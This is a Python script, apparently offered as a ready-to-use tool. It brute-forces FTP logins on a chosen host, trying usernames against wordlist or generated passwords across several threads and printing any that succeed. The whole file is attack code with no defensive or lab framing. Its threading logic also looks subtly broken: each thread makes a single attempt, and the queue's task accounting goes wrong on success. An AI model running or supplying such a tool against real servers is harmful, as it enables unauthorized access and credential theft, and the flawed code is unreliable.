# advanced_ftp_brute.py

import ftplib
import threading
import queue
import argparse
import itertools
import string
from colorama import init, Fore

# Initialize colorama
init()

# Function to generate passwords dynamically
def generate_passwords(chars, length):
    for combo in itertools.product(chars, repeat=length):
        yield ''.join(combo)

# Function to attempt FTP connection
def connect_ftp(host, port, user, password, q):
    try:
        server = ftplib.FTP()
        server.connect(host, port, timeout=5)
        server.login(user, password)
        print(f"{Fore.GREEN}[+] Found: {user}:{password}{Fore.RESET}")
        while not q.empty():
            q.get_nowait()
            q.task_done()
    except ftplib.error_perm:
        print(f"{Fore.RED}[-] Failed: {user}:{password}{Fore.RESET}")
    except Exception as e:
        print(f"{Fore.RED}[!] Error: {e}{Fore.RESET}")
    finally:
        q.task_done()

# Load lines from file
def load_lines(filename):
    with open(filename, 'r') as f:
        return f.read().splitlines()

def main():
    parser = argparse.ArgumentParser(description="Advanced FTP Brute Force Tool")
    parser.add_argument("--host", required=True, help="Target FTP server IP or hostname")
    parser.add_argument("--port", type=int, default=21, help="FTP port (default 21)")
    parser.add_argument("-u", "--userlist", help="File with usernames")
    parser.add_argument("-w", "--wordlist", help="File with passwords")
    parser.add_argument("-g", "--generate", action="store_true", help="Generate passwords instead of using wordlist")
    parser.add_argument("-l", "--length", type=int, default=2, help="Length of generated passwords")
    parser.add_argument("-t", "--threads", type=int, default=5, help="Number of threads (default 5)")

    args = parser.parse_args()

    host = args.host
    port = args.port
    threads_count = args.threads

    q = queue.Queue()

    # Load users
    if args.userlist:
        users = load_lines(args.userlist)
    else:
        users = ['anonymous']  # Default user if none provided

    # Load or generate passwords
    if args.generate:
        chars = string.ascii_lowercase
        for pwd in generate_passwords(chars, args.length):
            for user in users:
                q.put((user, pwd))
    else:
        passwords = load_lines(args.wordlist)
        for pwd in passwords:
            for user in users:
                q.put((user, pwd))

    # Launch threads
    for _ in range(threads_count):
        t = threading.Thread(target=lambda: connect_ftp(host, port, *q.get(), q))
        t.daemon = True
        t.start()

    q.join()

    print("\nBrute-force complete.")

if __name__ == "__main__":
    main()
